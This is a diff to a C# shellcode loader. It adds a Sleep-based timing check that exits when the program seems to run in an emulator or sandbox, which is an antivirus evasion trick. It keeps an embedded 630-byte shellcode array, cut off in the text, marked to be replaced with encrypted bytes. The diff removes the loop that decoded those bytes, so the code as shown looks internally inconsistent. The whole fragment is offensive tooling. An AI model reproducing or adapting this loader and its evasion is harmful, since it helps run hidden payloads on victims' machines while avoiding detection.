@@ -21,16 +21,22 @@ namespace ConsoleApp1
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
 
+	[DllImport("kernel32.dll")]
+	static extern void Sleep(uint dwMilliseconds);
+
         static void Main(string[] args)
         {
+	    // Sleep call: Checks if the script is being run in an emulator
+	    DateTime t1 = DateTime.Now;
+	    Sleep(2000);
+	    double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+	    if(t2 < 1.5)
+	    {
+		return;
+	    }
+
 	    // EDIT THIS PART: REPLACE SHELLCODE WITH ENCRYPTED SHELLCODE BYTES
             byte[] buf = new byte[630] {0xfc,0x48,0x83,0xe4,...
-
-	    // Note: Change the "- 2" to whatever offset we used (in shellcode_caesar_enc.cs)
-	    for (int i = 0; i < buf.Length; i++)
-	    {
-		buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
-	    }
 
             int size = buf.Length;
 
